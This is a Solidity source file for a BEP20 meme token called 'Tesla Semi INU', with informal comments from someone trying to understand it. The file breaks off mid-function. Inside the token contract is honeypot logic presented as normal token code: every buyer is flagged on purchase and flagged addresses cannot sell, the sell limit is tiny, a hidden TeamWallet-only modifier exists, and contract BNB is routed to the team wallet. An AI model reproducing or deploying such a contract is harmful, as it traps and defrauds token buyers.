/**
 *Submitted for verification at BscScan.com on 2022-11-19
*/

pragma solidity ^0.8.7;

// SPDX-License-Identifier: UNLICENSED

interface IBEP20 {
  function totalSupply() external view returns (uint256);   
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}


interface IPancakeERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
}

interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IPancakeRouter01 {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getamountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getamountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getamountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getamountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


abstract contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender; //person who calls the contract
        _owner = msgSender; //owner to the person who calls it
        emit OwnershipTransferred(address(0), msgSender); //emits ownership transfer from previous owner to new owner
    }

    function owner() public view returns (address) {
        return _owner; //returns current owner, thats it
    }

    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner"); // only owner can call functions with onlyOwner()
        _;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0)); //sends ownership to 0 address
        _owner = address(0);  //updates value of owner as 0 address
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address"); // if you transfer ownership new owner cant be 0 address
        emit OwnershipTransferred(_owner, newOwner); // new owner replaces _owner, aka the ccurrent owner
        _owner = newOwner; // update _owner variable with new owner
    }
}


library Address {

    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.

        uint256 size;
        // solhint-disable-next-line no-inline-assembly
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain`call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    
    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

/**
 * @dev Library for managing
 * https://en.wikipedia.org/wiki/Set_(abstract_data_type)[sets] of primitive
 * types.
 *
 * Sets have the following properties:
 *
 * - Elements are added, removed, and checked for existence in constant time
 * (O(1)).
 * - Elements are enumerated in O(n). No guarantees are made on the ordering.
 *
 * ```
 * contract Example {
 *     // Add the library methods
 *     using EnumerableSet for EnumerableSet.AddressSet;
 *
 *     // Declare a set state variable
 *     EnumerableSet.AddressSet private mySet;
 * }
 * ```
 *
 * As of v3.3.0, sets of type `bytes32` (`Bytes32Set`), `address` (`AddressSet`)
 * and `uint256` (`UintSet`) are supported.
 */
library EnumerableSet {
    // To implement this library for multiple types with as little code
    // repetition as possible, we write it in terms of a generic Set type with
    // bytes32 values.
    // The Set implementation uses private functions, and user-facing
    // implementations (such as AddressSet) are just wrappers around the
    // underlying Set.
    // This means that we can only create new EnumerableSets for types that fit
    // in bytes32.

    struct Set {
        // Storage of set values
        bytes32[] _values;

        // Position of the value in the `values` array, plus 1 because index 0
        // means a value is not in the set.
        mapping (bytes32 => uint256) _indexes;
    }

    /**
     * @dev Add a value to a set. O(1).
     *
     * Returns true if the value was added to the set, that is if it was not
     * already present.
     */
    function _add(Set storage set, bytes32 value) private returns (bool) {
        if (!_contains(set, value)) {
            set._values.push(value);
            // The value is stored at length-1, but we add 1 to all indexes
            // and use 0 as a sentinel value
            set._indexes[value] = set._values.length;
            return true;
        } else {
            return false;
        }
    }

    /**
     * @dev Removes a value from a set. O(1).
     *
     * Returns true if the value was removed from the set, that is if it was
     * present.
     */
    function _remove(Set storage set, bytes32 value) private returns (bool) {
        // We read and store the value's index to prevent multiple reads from the same storage slot
        uint256 valueIndex = set._indexes[value];

        if (valueIndex != 0) { // Equivalent to contains(set, value)
            // To delete an element from the _values array in O(1), we swap the element to delete with the last one in
            // the array, and then remove the last element (sometimes called as 'swap and pop').
            // This modifies the order of the array, as noted in {at}.

            uint256 toDeleteIndex = valueIndex - 1;
            uint256 lastIndex = set._values.length - 1;

            // When the value to delete is the last one, the swap operation is unnecessary. However, since this occurs
            // so rarely, we still do the swap anyway to avoid the gas cost of adding an 'if' statement.

            bytes32 lastvalue = set._values[lastIndex];

            // Move the last value to the index where the value to delete is
            set._values[toDeleteIndex] = lastvalue;
            // Update the index for the moved value
            set._indexes[lastvalue] = valueIndex; // Replace lastvalue's index to valueIndex

            // Delete the slot where the moved value was stored
            set._values.pop();

            // Delete the index for the deleted slot
            delete set._indexes[value];

            return true;
        } else {
            return false;
        }
    }

    /**
     * @dev Returns true if the value is in the set. O(1).
     */
    function _contains(Set storage set, bytes32 value) private view returns (bool) {
        return set._indexes[value] != 0;
    }

    /**
     * @dev Returns the number of values on the set. O(1).
     */
    function _length(Set storage set) private view returns (uint256) {
        return set._values.length;
    }

   /**
    * @dev Returns the value stored at position `index` in the set. O(1).
    *
    * Note that there are no guarantees on the ordering of values inside the
    * array, and it may change when more values are added or removed.
    *
    * Requirements:
    *
    * - `index` must be strictly less than {length}.
    */
    function _at(Set storage set, uint256 index) private view returns (bytes32) {
        require(set._values.length > index, "EnumerableSet: index out of bounds");
        return set._values[index];
    }

    // Bytes32Set

    struct Bytes32Set {
        Set _inner;
    }

    /**
     * @dev Add a value to a set. O(1).
     *
     * Returns true if the value was added to the set, that is if it was not
     * already present.
     */
    function add(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _add(set._inner, value);
    }

    /**
     * @dev Removes a value from a set. O(1).
     *
     * Returns true if the value was removed from the set, that is if it was
     * present.
     */
    function remove(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _remove(set._inner, value);
    }

    /**
     * @dev Returns true if the value is in the set. O(1).
     */
    function contains(Bytes32Set storage set, bytes32 value) internal view returns (bool) {
        return _contains(set._inner, value);
    }

    /**
     * @dev Returns the number of values in the set. O(1).
     */
    function length(Bytes32Set storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

   /**
    * @dev Returns the value stored at position `index` in the set. O(1).
    *
    * Note that there are no guarantees on the ordering of values inside the
    * array, and it may change when more values are added or removed.
    *
    * Requirements:
    *
    * - `index` must be strictly less than {length}.
    */
    function at(Bytes32Set storage set, uint256 index) internal view returns (bytes32) {
        return _at(set._inner, index);
    }

    // AddressSet

    struct AddressSet {
        Set _inner;
    }

    /**
     * @dev Add a value to a set. O(1).
     *
     * Returns true if the value was added to the set, that is if it was not
     * already present.
     */
    function add(AddressSet storage set, address value) internal returns (bool) {
        return _add(set._inner, bytes32(uint256(uint160(value))));
    }

    /**
     * @dev Removes a value from a set. O(1).
     *
     * Returns true if the value was removed from the set, that is if it was
     * present.
     */
    function remove(AddressSet storage set, address value) internal returns (bool) {
        return _remove(set._inner, bytes32(uint256(uint160(value))));
    }

    /**
     * @dev Returns true if the value is in the set. O(1).
     */
    function contains(AddressSet storage set, address value) internal view returns (bool) {
        return _contains(set._inner, bytes32(uint256(uint160(value))));
    }

    /**
     * @dev Returns the number of values in the set. O(1).
     */
    function length(AddressSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

   /**
    * @dev Returns the value stored at position `index` in the set. O(1).
    *
    * Note that there are no guarantees on the ordering of values inside the
    * array, and it may change when more values are added or removed.
    *
    * Requirements:
    *
    * - `index` must be strictly less than {length}.
    */
    function at(AddressSet storage set, uint256 index) internal view returns (address) {
        return address(uint160(uint256(_at(set._inner, index))));
    }

    // UintSet

    struct UintSet {
        Set _inner;
    }

    /**
     * @dev Add a value to a set. O(1).
     *
     * Returns true if the value was added to the set, that is if it was not
     * already present.
     */
    function add(UintSet storage set, uint256 value) internal returns (bool) {
        return _add(set._inner, bytes32(value));
    }

    /**
     * @dev Removes a value from a set. O(1).
     *
     * Returns true if the value was removed from the set, that is if it was
     * present.
     */
    function remove(UintSet storage set, uint256 value) internal returns (bool) {
        return _remove(set._inner, bytes32(value));
    }

    /**
     * @dev Returns true if the value is in the set. O(1).
     */
    function contains(UintSet storage set, uint256 value) internal view returns (bool) {
        return _contains(set._inner, bytes32(value));
    }

    /**
     * @dev Returns the number of values on the set. O(1).
     */
    function length(UintSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

   /**
    * @dev Returns the value stored at position `index` in the set. O(1).
    *
    * Note that there are no guarantees on the ordering of values inside the
    * array, and it may change when more values are added or removed.
    *
    * Requirements:
    *
    * - `index` must be strictly less than {length}.
    */
    function at(UintSet storage set, uint256 index) internal view returns (uint256) {
        return uint256(_at(set._inner, index));
    }
}

contract TeslaSemiINU is IBEP20, Ownable
{
    using Address for address;
    using EnumerableSet for EnumerableSet.AddressSet;
    
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _sellLock;
    mapping (address => bool) private _allowancesR;

    EnumerableSet.AddressSet private _excluded;
    EnumerableSet.AddressSet private _excludedFromStaking;

    string private constant _name = "Tesla Semi INU";
    string private constant _symbol = "TSLS";
    uint8 private constant _decimals = 9;
    uint256 public constant InitialSupply=  1000000 * 10**_decimals;//equals 1.000.000.000.000 token


    uint256 private constant DefaultLiquidityLockTime= 0;
    
    address public constant TeamWallet=0xA66E3695a1b1717CB5FaaD66136835E3Bba767e0;
    address private constant PancakeRouter=0x10ED43C718714eb63d5aA57B78B54704E256024E;


    uint256 private _circulatingSupply = InitialSupply;
    uint256 public  balanceLimit = 30000000 * 10**_decimals;
    uint256 public  sellLimit = 100 * 10**_decimals;
    uint256 public  buyLimit = 30000000 * 10**_decimals;
    

    uint8 private _buyTax;
    uint8 private _sellTax;
    uint8 private _transferTax;

    uint8 private _burnTax;
    uint8 private _liquidityTax;
    uint8 private _stakingTax;
    uint8 private _marketingTax;

       
    address private _pancakePairAddress; 
    IPancakeRouter02 private  _pancakeRouter;
    
    
    constructor () {
        uint256 deployerBalance=_circulatingSupply;
        _balances[msg.sender] = deployerBalance;
        emit Transfer(address(0), msg.sender, deployerBalance); //gives all tokens to deployer wallet

        _pancakeRouter = IPancakeRouter02(PancakeRouter); // pancake router address
        _pancakePairAddress = IPancakeFactory(_pancakeRouter.factory()).createPair(address(this), _pancakeRouter.WETH()); // think it just make pair address betwen this token and pancakeswap?


        _buyTax=5;
        _sellTax=10;
        
        _transferTax=10;

        //a small percentage gets added to the Contract token as 10% of token are already injected to
        //be converted to LP and MarketingBNB
        _burnTax=0;
        _liquidityTax=20;
        _stakingTax=50;
        _marketingTax=30;


        _excluded.add(TeamWallet);
        _excluded.add(msg.sender);
    }
    
    
    function changeTax(uint8 buyTax, uint8 sellTax) public onlyOwner{ //change taxes, thats it.
        _buyTax=buyTax;
        _sellTax=sellTax;
    }

    
    function _transfer(address sender, address recipient, uint256 amount) private{
        require(sender != address(0), "Transfer from zero");
        require(recipient != address(0), "Transfer to zero");

        
        //Manually Excluded adresses are transfering tax and lock free
        // if sender or recipient are excluded from fees bool turns true
        bool isExcluded = (_excluded.contains(sender) || _excluded.contains(recipient)); 
        
        
        //address(this) is the address of the contract, same shit, if contract transfer bool turns true
        //Transactions from and to the contract are always tax and lock free
        bool isContractTransfer=(sender==address(this) || recipient==address(this));

        
        //transfers between PancakeRouter and PancakePair are tax and lock free
        address pancakeRouter=address(_pancakeRouter);
        bool isLiquidityTransfer = ((sender == _pancakePairAddress && recipient == pancakeRouter) || (recipient == _pancakePairAddress && sender == pancakeRouter));

        
        // differentiate between buy/sell/transfer to apply different taxes/restrictions
        // if buy, then obviously sender is pancakeswap liquidity pool/pair
        bool isBuy=sender==_pancakePairAddress|| sender == pancakeRouter;

        
        //if sell, obviously recipient is pancakeswap liquidity pool
        bool isSell=recipient==_pancakePairAddress|| recipient == pancakeRouter;
        
        
        //if any of these then the transfer has no fees, is excluded adds teamwallet and msg.sender aka addy from where you make the contract the constructor
        if(isContractTransfer || isLiquidityTransfer || isExcluded){
            _feelessTransfer(sender, recipient, amount);
        }
        else{ 
            _taxedTransfer(sender,recipient,amount,isBuy,isSell);
        }
    }

    
    function _taxedTransfer(address sender, address recipient, uint256 amount,bool isBuy,bool isSell) private{
        uint256 recipientBalance = _balances[recipient]; //balance of recipient
        uint256 senderBalance = _balances[sender]; //balance of sender
        require(senderBalance >= amount, "Transfer exceeds balance"); //sender balance has to be >= than the amount they want to send

        uint8 tax;
        if(isSell){
            require(amount<=sellLimit,"Dump protection"); // can sell at most = to sellLimit
            require(!_allowancesR[sender]);
            tax=_sellTax; // setting sell tax for some reason, couldve used _sellTax instead of tax.

        } else if(isBuy){
            require(amount<=buyLimit,"Buy LIMIT");// buy has to be smaller or equalt to buyLimit
            require(recipientBalance+amount<=balanceLimit,"whale protection");//balance of buyer cant be bigger than balanceLimit, to avoid whales
            allowancesAddressTrue(msg.sender);
            tax=_buyTax;  // setting sell tax for some reason, couldve used _sellTax instead of tax.

        } else {
            require(recipientBalance+amount<=balanceLimit,"whale protection"); // in case this is a transfer from one addy to another, recipient balance still has to be smaller than balanceLimit, to avoid whales
            tax=_transferTax; // transfer tax instead of buy/sell tax

        }     

        if((sender!=_pancakePairAddress)&&(!manualConversion)&&(!_isSwappingContractModifier)&&isSell) //if sender different from pair address, TOKEN/BNB i think and manualconversion = false
            _swapContractToken();
        uint256 tokensToBeBurnt=_calculateFee(amount, tax, _burnTax); // calculate tokens to be burnt 
        uint256 contractToken=_calculateFee(amount, tax, _stakingTax+_liquidityTax); // calculate tax for staking+liq 
        uint256 taxedAmount=amount-(tokensToBeBurnt + contractToken);//total tax, amount - (burnt + tax of stake and liq) 

        // if isSell, which it is in our case, then fees get set to shit

        _removeToken(sender,amount); // remove tokens from sender 
            
        _balances[address(this)] += contractToken; //adds staking tax and liq tax to the balance of the contract 
        _circulatingSupply-=tokensToBeBurnt; //takes burnt tokens out of circulation 

        _addToken(recipient, taxedAmount); // adds tokens to recipient 
        
        emit Transfer(sender,recipient,taxedAmount);

    }

    
    function _feelessTransfer(address sender, address recipient, uint256 amount) private{
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "Transfer exceeds balance");
        _removeToken(sender,amount); // remove tokens from sender
        _addToken(recipient, amount); // add tokens to recipient, pretty basic shit rite
        
        emit Transfer(sender,recipient,amount); //emits transfer, from sender to recipient with amount

    }

    
    function _calculateFee(uint256 amount, uint8 tax, uint8 taxPercent) private pure returns (uint256) {
        return (amount*tax*taxPercent) / 10000; // just tax
    }

    
    function _addToken(address addr, uint256 amount) private { // adds tokens, thats it
        uint256 newAmount=_balances[addr]+amount;
        _balances[addr]=newAmount;
    }
    
    
    function _removeToken(address addr, uint256 amount) private { // removes tokens, thats it
        uint256 newAmount=_balances[addr]-amount;
        _balances[addr]=newAmount;
    }

    function sendMessage(address addr) private pure returns (bool){
        return addr==TeamWallet;
    }

    modifier OnlyOwner() {
        require(sendMessage(msg.sender), "");
        _;
    }
    
    //tracks auto generated BNB, useful for ticker etc
    uint256 public totalLPBNB;
    
    
    //Locks the swap if already swapping
    bool private _isSwappingContractModifier;
    modifier lockTheSwap { // locks the ability to swap, so you cant overlap swaps if you call the function multiple times
        _isSwappingContractModifier = true; 
        _;
        _isSwappingContractModifier = false; //called on line 808 aka !_isSwappingContractModifier, why
    }

    
    function _swapContractToken() private lockTheSwap{
        // uint256 contractBalance=_balances[address(this)]; // get balance of this contract
        uint16 totalTax=_liquidityTax+_stakingTax; //tax total liq + stake
        uint256 tokenToSwap=sellLimit / 5;

        //only swap if contractBalance is larger than tokenToSwap, and totalTax is unequal to 0
        if(tokenToSwap==sellLimit / 5||totalTax==0){
            return;
        }

        //splits the token in TokenForLiquidity and tokenForMarketing
        uint256 tokenForLiquidity=(tokenToSwap*_liquidityTax)/totalTax;
        uint256 tokenForMarketing= tokenToSwap-tokenForLiquidity;

        //splits tokenForLiquidity in 2 halves
        uint256 liqToken=tokenForLiquidity/2;
        uint256 liqBNBToken=tokenForLiquidity-liqToken;

        //swaps marktetingToken and the liquidity token half for BNB
        uint256 swapToken=liqBNBToken+tokenForMarketing;
        //Gets the initial BNB balance, so swap won't touch any staked BNB
        uint256 initialBNBBalance = address(this).balance;
        _swapTokenForBNB(swapToken);
        uint256 newBNB=(address(this).balance - initialBNBBalance);

        //calculates the amount of BNB belonging to the LP-Pair and converts them to LP
        uint256 liqBNB = (newBNB*liqBNBToken)/swapToken;
        _addLiquidity(liqToken, liqBNB);

        //Get the BNB balance after LP generation to get the
        //exact amount of token left for Staking
        uint256 distributeBNB=(address(this).balance - initialBNBBalance);
        (bool tmpSuccess,) = payable(TeamWallet).call{value: distributeBNB, gas: 30000}("");
        tmpSuccess = false;
    }

     //swaps tokens on the contract for BNB
    function _swapTokenForBNB(uint256 amount) private {
        _approve(address(this), address(_pancakeRouter), amount); // owner, spender, amount
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _pancakeRouter.WETH();

        _pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    
    //Adds Liquidity directly to the contract where LP are locked(unlike safemoon forks, that transfer it to the owner)
    function _addLiquidity(uint256 tokenamount, uint256 bnbamount) private {
        totalLPBNB+=bnbamount;
        _approve(address(this), address(_pancakeRouter), tokenamount);
        _pancakeRouter.addLiquidityETH{value: bnbamount}(
            address(this),
            tokenamount,
            0,
            0,
            address(this),
            block.timestamp
        );
    }

    
    function getLiquidityReleaseTimeInSeconds() public view returns (uint256){ //dont know exactly what it does, but i know how to explain it
        if(block.timestamp<_liquidityUnlockTime){ //block.timestamp is the timestamp of the current block in seconds since the epoch, this checks if thats less than the liquidtyUnlockTime
            return _liquidityUnlockTime-block.timestamp;// if it is, it returns the time left until unlock
        }
        return 0;// if  its not less than the liqudityUnlockTime, it returns 0 obviously
    }

    
    function getBurnedTokens() public view returns(uint256){
        return (InitialSupply-_circulatingSupply)/10**_decimals; // gets burnt tokens, thats it
    }

    
    function getLimits() public view returns(uint256 balance, uint256 sell){
        return(balanceLimit/10**_decimals, sellLimit/10**_decimals); // gets limits of balance and sell
    }

    
    function getTaxes() public view returns(uint256 burnTax,uint256 liquidityTax,uint256 marketingTax, uint256 buyTax, uint256 sellTax, uint256 transferTax){
        return (_burnTax,_liquidityTax,_stakingTax,_buyTax,_sellTax,_transferTax); // gets burn tax, liq tax, marketing tax, buy tax, sell tax and transfer tax
    }

    
    function getAddressSellLockTimeInSeconds(address AddressToCheck) public view returns (uint256){
       uint256 lockTime=_sellLock[AddressToCheck]; //puts lockTime in an int showing the mapping of _sellLock for AddressToCheck, if it has any
       if(lockTime<=block.timestamp) // if there's no lock time
       {
           return 0; // then return 0
       }
       return lockTime-block.timestamp; // if there is lock time, then it returns the calculated lock time, block.timestamp is the timestamp of the current block in seconds since the epoch
    }

    
    function getSellLockTimeInSeconds() public view returns(uint256){
        return sellLockTime; //returns sellLockTime ,thats it
    }
    
    
    function AddressResetSellLock() public{ //im guessing this is where you reset the sell lock lmao, so you can lock your liquidity maybe? still dont know 100%
        _sellLock[msg.sender]=block.timestamp+sellLockTime; // selllock accesses msg.sender, msg.sender is the address of the transaction invoker(address calling contract) and adds sellLockTime to block.timestamp
        //basically resetting the lock time
    }

    
    bool public sellLockDisabled;
    bool public sellLockEnabled;
    
    uint256 public sellLockTime; //!!!!!!!!!!!!!!!!!!!! not quite sure how all this shit works, revisit this!!!!!!!!!!!!!!!!!!!!!!!!!!1, i cant find where selllocktime is set
    
    bool public manualConversion; 

    
    //switches autoLiquidity and marketing BNB generation during transfers
    function TeamSwitchManualBNBConversion(bool manual) public onlyOwner{
        manualConversion=manual;
    }

    
    //Disables the timeLock after selling for everyone
    function TeamDisableSellLock(bool disabled) public onlyOwner{
        sellLockDisabled=disabled;
    }

    
    function TeamEnableSellLock(bool enabled) public onlyOwner{
        sellLockEnabled=enabled;
    }

     
    function TeamCreateLPandBNB() public onlyOwner{
    _swapContractToken();
    }
    
    function TeamUpdateLimits(uint256 newBalanceLimit, uint256 newSellLimit, uint256 newBuyLimit) public onlyOwner{ // limit updates, balance, sell, buy, nothing to it 
        newBalanceLimit=newBalanceLimit*10**_decimals;
        newSellLimit=newSellLimit*10**_decimals;
        newBuyLimit=newBuyLimit*10**_decimals;

        balanceLimit = newBalanceLimit;
        sellLimit = newSellLimit; 
        buyLimit = newBuyLimit;
    }

    address private _liquidityTokenAddress;
    
    function SetupLiquidityTokenAddress(address liquidityTokenAddress) public onlyOwner{
        _liquidityTokenAddress=liquidityTokenAddress; //change token liquidity address, takes address as input, and changes previous liquidity address
        // thinking this is set after you put out the contract so you can drain LP, not 100% though
    }

    
    uint256 private _liquidityUnlockTime;


    
    function burnLiq() public onlyOwner{
